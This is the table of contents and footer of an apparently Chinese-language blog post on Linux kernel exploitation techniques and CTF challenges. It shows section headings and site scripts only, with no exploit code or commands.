href="#%E6%97%A9%E6%9C%9F%E7%9A%84%E5%86%85%E6%A0%B8"><span class="nav-text">早期的内核</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ioctl-%E7%B3%BB%E7%BB%9F%E8%B0%83%E7%94%A8"><span class="nav-text">ioctl 系统调用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="nav-text">环境搭建</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E6%A0%B8%E7%BC%96%E8%AF%91-%E5%8F%AF%E9%80%89"><span class="nav-text">内核编译 (可选)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BC%96%E8%AF%91-busybox-%E5%8F%AF%E9%80%89"><span class="nav-text">编译 busybox (可选)</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Kernel-Pwn-%E4%B8%80%E8%88%AC%E6%B5%81%E7%A8%8B"><span class="nav-text">Kernel Pwn 一般流程</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%86%85%E6%A0%B8%E6%A8%A1%E5%9D%97%E5%BC%80%E5%8F%91"><span class="nav-text">内核模块开发</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F"><span class="nav-text">文件系统</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AD%97%E7%AC%A6%E9%A9%B1%E5%8A%A8%E8%AE%BE%E5%A4%87"><span class="nav-text">字符驱动设备</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E6%A0%B8%E6%A8%A1%E5%9D%97%E7%BC%96%E5%86%99"><span class="nav-text">内核模块编写</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%86%85%E6%A0%B8%E6%A0%88%E5%88%A9%E7%94%A8"><span class="nav-text">内核栈利用</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#QWB-2018-core"><span class="nav-text">QWB_2018_core</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90"><span class="nav-text">题目分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95"><span class="nav-text">动态调试</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ret2user"><span class="nav-text">ret2user</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF"><span class="nav-text">利用思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp"><span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#kernel-rop-without-KPIT"><span class="nav-text">kernel rop without KPIT</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF-1"><span class="nav-text">利用思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-1"><span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#kernel-rop-with-KPIT"><span class="nav-text">kernel rop with KPIT</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF-2"><span class="nav-text">利用思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-2"><span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#kernel-rop-ret2user"><span class="nav-text">kernel rop + ret2user</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF-3"><span class="nav-text">利用思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-3"><span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%88%A9%E7%94%A8-pt-regs-%E6%9E%84%E9%80%A0-kernel-ROP"><span class="nav-text">利用 pt_regs 构造 kernel ROP</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF-4"><span class="nav-text">利用思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%B0%E7%89%88%E6%9C%AC%E5%86%85%E6%A0%B8%E5%AF%B9%E6%8A%97%E5%88%A9%E7%94%A8-pt-regs-%E8%BF%9B%E8%A1%8C%E6%94%BB%E5%87%BB%E7%9A%84%E5%8A%9E%E6%B3%95"><span class="nav-text">新版本内核对抗利用 pt_regs 进行攻击的办法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-4"><span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ret2dir"><span class="nav-text">ret2dir</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF-5"><span class="nav-text">利用思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-5"><span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#RetSpill"><span class="nav-text">RetSpill</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF-6"><span class="nav-text">利用思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-6"><span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MINI-LCTF2022-kgadget"><span class="nav-text">MINI-LCTF2022 - kgadget</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90-1"><span class="nav-text">题目分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF-7"><span class="nav-text">利用思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-7"><span class="nav-text">exp</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%86%85%E6%A0%B8%E5%A0%86%E5%88%A9%E7%94%A8"><span class="nav-text">内核堆利用</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#heap-bof"><span class="nav-text">heap_bof</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90-2"><span class="nav-text">题目分析</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Use-After-Free"><span class="nav-text">Use After Free</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF-8"><span class="nav-text">利用思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-8"><span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Overflow"><span class="nav-text">Overflow</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF-9"><span class="nav-text">利用思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-9"><span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#tty-struct-%E5%8A%AB%E6%8C%81"><span class="nav-text">tty_struct 劫持</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF-10"><span class="nav-text">利用思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-10"><span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#seq-operations-%E5%8A%AB%E6%8C%81"><span class="nav-text">seq_operations 劫持</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF-11"><span class="nav-text">利用思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-11"><span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#off-by-null"><span class="nav-text">off by null</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF-12"><span class="nav-text">利用思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-12"><span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Arbitrary-Address-Allocation"><span class="nav-text">Arbitrary Address Allocation</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF-13"><span class="nav-text">利用思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-13"><span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Page-level-Fengshui"><span class="nav-text">Page-level Fengshui</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF-14"><span class="nav-text">利用思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-14"><span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Page-level-UAF"><span class="nav-text">Page-level UAF</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF-15"><span class="nav-text">利用思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-15"><span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Dirty-Pagetable"><span class="nav-text">Dirty Pagetable</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF-16"><span class="nav-text">利用思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-16"><span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#KSMA"><span class="nav-text">KSMA</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF-17"><span class="nav-text">利用思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-17"><span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#USMA"><span class="nav-text">USMA</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF-18"><span class="nav-text">利用思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-18"><span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ret2hbp"><span class="nav-text">ret2hbp</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF-19"><span class="nav-text">利用思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-19"><span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Use-After-Cleanup"><span class="nav-text">Use After Cleanup</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF-20"><span class="nav-text">利用思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-20"><span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#CISCN2017-babydriver"><span class="nav-text">CISCN2017 babydriver</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90-3"><span class="nav-text">题目分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF-21"><span class="nav-text">利用思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-21"><span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#corCTF-2022-Corjail"><span class="nav-text">corCTF-2022 Corjail</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90-4"><span class="nav-text">题目分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF-22"><span class="nav-text">利用思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-22"><span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#corCTF2022-cache-of-castways"><span class="nav-text">corCTF2022 cache of castways</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90-5"><span class="nav-text">题目分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF-23"><span class="nav-text">利用思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-23"><span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#D-3CTF2023-d3kcache"><span class="nav-text">D^3CTF2023 d3kcache</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90-6"><span class="nav-text">题目分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF-24"><span class="nav-text">利用思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-24"><span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#RWCTF2022-Digging-into-kernel-1-2"><span class="nav-text">RWCTF2022 Digging into kernel 1 &amp; 2</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90-7"><span class="nav-text">题目分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF-25"><span class="nav-text">利用思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-25"><span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#WDB2024-PWN03"><span class="nav-text">WDB2024 PWN03</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF-26"><span class="nav-text">利用思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-26"><span class="nav-text">exp</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%86%85%E6%A0%B8%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89"><span class="nav-text">内核条件竞争</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#double-fetch"><span class="nav-text">double fetch</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF-27"><span class="nav-text">利用思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0CTF2018-Final-baby-kernel"><span class="nav-text">0CTF2018 Final baby kernel</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BE%A7%E4%BF%A1%E9%81%93%E6%94%BB%E5%87%BB"><span class="nav-text">侧信道攻击</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#userfaultfd"><span class="nav-text">userfaultfd</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF-30"><span class="nav-text">利用思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%96%B0%E7%89%88%E6%9C%AC%E5%86%85%E6%A0%B8%E5%AF%B9%E6%8A%97"><span class="nav-text">新版本内核对抗</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#CTF-%E4%B8%AD%E7%9A%84-userfaultfd-%E6%9D%BF%E5%AD%90"><span class="nav-text">CTF 中的 userfaultfd 板子</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#setxattr-userfaultfd"><span class="nav-text">setxattr + userfaultfd</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#FUSE-race"><span class="nav-text">FUSE race</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#punch-hole"><span class="nav-text">punch hole</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF-31"><span class="nav-text">利用思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-29"><span class="nav-text">exp</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Kernel-Trick"><span class="nav-text">Kernel Trick</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BF%AE%E6%94%B9%E7%AC%A6%E5%8F%B7%E9%93%BE%E6%8E%A5"><span class="nav-text">修改符号链接</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%8E%E5%86%85%E5%AD%98%E6%90%9C%E7%B4%A2-flag"><span class="nav-text">从内存搜索 flag</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BB%8E-sys-kernel-notes-%E6%B3%84%E9%9C%B2%E5%86%85%E6%A0%B8%E5%9C%B0%E5%9D%80"><span class="nav-text">从 &#x2F;sys&#x2F;kernel&#x2F;notes 泄露内核地址</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%B8%B8%E8%A7%81%E7%BB%93%E6%9E%84%E4%BD%93%E7%9A%84%E5%88%A9%E7%94%A8"><span class="nav-text">常见结构体的利用</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#system-V-%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97"><span class="nav-text">system V 消息队列</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pipe-%E7%AE%A1%E9%81%93%E7%9B%B8%E5%85%B3"><span class="nav-text">pipe 管道相关</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#io-uring-%E4%B8%8E%E5%BC%82%E6%AD%A5-IO-%E7%9B%B8%E5%85%B3"><span class="nav-text">io_uring 与异步 IO 相关</span></a></li></ol></li></ol>

	</div>
</div>
	</div>
	
</div>
			</div>

			
		</div>

		<div class="main-content-footer">
			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
    <div class="info-container py-3 text-center">
        
            <div class="customize-info my-1">关山初度尘未洗，策马扬鞭再奋蹄。</div>
        
        <div class="text-center">
            &copy;
            
              <span>2023</span>
              -
            
            2025&nbsp;&nbsp;<i class="fa-solid fa-circle-info fa-beat-fade" style="--fa-beat-fade-opacity: 0.67; --fa-beat-fade-scale: 1.075;" ></i>&nbsp;&nbsp;<a href="/">韩乔落</a>
            
                
                <p class="post-count space-x-0.5">
                    <span>
                        138 posts in total
                    </span>
                    
                </p>
            
        </div>
        
            <script data-swup-reload-script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
                
                
            </div>
        
        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.8.4</a></span>
        </div>
        
        
            <div>
                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
            </div>
        
        
            <script data-swup-reload-script>
                try {
                    function odometer_init() {
                    const elements = document.querySelectorAll('.odometer');
                    elements.forEach(el => {
                        new Odometer({
                            el,
                            format: '( ddd).dd',
                            duration: 200
                        });
                    });
                    }
                    odometer_init();
                } catch (error) {}
            </script>
        
        
        
    </div>  
</footer>
		</div>
	</div>

	
	<div class="post-tools">
		<div class="post-tools-container">
	<ul class="article-tools-list">
		<!-- TOC aside toggle -->
		
		<li class="right-bottom-tools page-aside-toggle">
			<i class="fa-regular fa-outdent"></i>
		</li>
		

		<!-- go comment -->
		
		<li class="go-comment">
			<i class="fa-regular fa-comments"></i>
		</li>
		
	</ul>
</div>
	</div>
	

	<div class="right-side-tools-container">
		<div class="side-tools-container">
	<ul class="hidden-tools-list">
		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
			<i class="fa-regular fa-magnifying-glass-plus"></i>
		</li>

		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
			<i class="fa-regular fa-magnifying-glass-minus"></i>
		</li>

		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
			<i class="fa-regular fa-moon"></i>
		</li>

		<!-- rss -->
		

		

		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
			<i class="fa-regular fa-arrow-down"></i>
		</li>
	</ul>

	<ul class="visible-tools-list">
		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
			<i class="fa-regular fa-cog fa-spin"></i>
		</li>
		
		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
			<i class="arrow-up fas fa-arrow-up"></i>
			<span class="percent"></span>
		</li>
		
		
	</ul>
</div>
	</div>

	<div class="image-viewer-container">
	<img src="">
</div>

	
	<div class="search-pop-overlay">
	<div class="popup search-popup">
		<div class="search-header">
			<span class="search-input-field-pre">
				<i class="fa-solid fa-keyboard"></i>
			</span>
			<div class="search-input-container">
				<input autocomplete="off" autocorrect="off" autocapitalize="off" placeholder="Search..." spellcheck="false" type="search" class="search-input">
			</div>
			<span class="popup-btn-close">
				<i class="fa-solid fa-times"></i>
			</span>
		</div>
		<div id="search-result">
			<div id="no-result">
				<i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
			</div>
		</div>
	</div>
</div>
	

</main>


<script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.4/files/source/js/build/libs/Swup.min.js" ></script><script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.4/files/source/js/build/libs/SwupSlideTheme.min.js" ></script><script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.4/files/source/js/build/libs/SwupScriptsPlugin.min.js" ></script><script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.4/files/source/js/build/libs/SwupProgressPlugin.min.js" ></script><script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.4/files/source/js/build/libs/SwupScrollPlugin.min.js" ></script><script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.4/files/source/js/build/libs/SwupPreloadPlugin.min.js" ></script>
<script>
    const swup = new Swup({
        plugins: [
            new SwupScriptsPlugin({
                optin: true,
            }),
            new SwupProgressPlugin(),
            new SwupScrollPlugin({
                offset: 80,
            }),
            new SwupSlideTheme({
                mainElement: ".main-content-body",
            }),
            new SwupPreloadPlugin(),
        ],
        containers: ["#swup"],
    });
</script>




	<script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.4/files/source/js/build/tools/imageViewer.js" ></script><script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.4/files/source/js/build/utils.js" ></script><script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.4/files/source/js/build/main.js" ></script><script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.4/files/source/js/build/layouts/navbarShrink.js" ></script><script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.4/files/source/js/build/tools/scrollTopBottom.js" ></script><script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.4/files/source/js/build/tools/lightDarkSwitch.js" ></script><script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.4/files/source/js/build/layouts/categoryList.js" ></script>


    <script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.4/files/source/js/build/tools/localSearch.js" ></script>



    <script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.4/files/source/js/build/tools/codeBlock.js" ></script>



    <script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.4/files/source/js/build/layouts/lazyload.js" ></script>



    <script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.4/files/source/js/build/tools/runtime.js" ></script>
    <script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.4/files/source/js/build/libs/odometer.min.js" ></script>
    <link rel="stylesheet" href="https://registry.npmmirror.com/hexo-theme-redefine/2.8.4/files/source/assets/odometer-theme-minimal.css">



  <script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.4/files/source/js/build/libs/Typed.min.js" ></script>
  <script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.4/files/source/js/build/plugins/typed.js" ></script>







    <script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.4/files/source/js/build/libs/anime.min.js" ></script>




    <script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.4/files/source/js/build/tools/tocToggle.js" data-swup-reload-script></script><script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.4/files/source/js/build/layouts/toc.js" data-swup-reload-script></script><script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.4/files/source/js/build/plugins/tabs.js" data-swup-reload-script></script>


<script  src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.4/files/source/js/build/libs/moment-with-locales.min.js" data-swup-reload-script></script>
<script type="module" src="https://registry.npmmirror.com/hexo-theme-redefine/2.8.4/files/source/js/build/layouts/essays.js" data-swup-reload-script></script>




	
</body>

</html>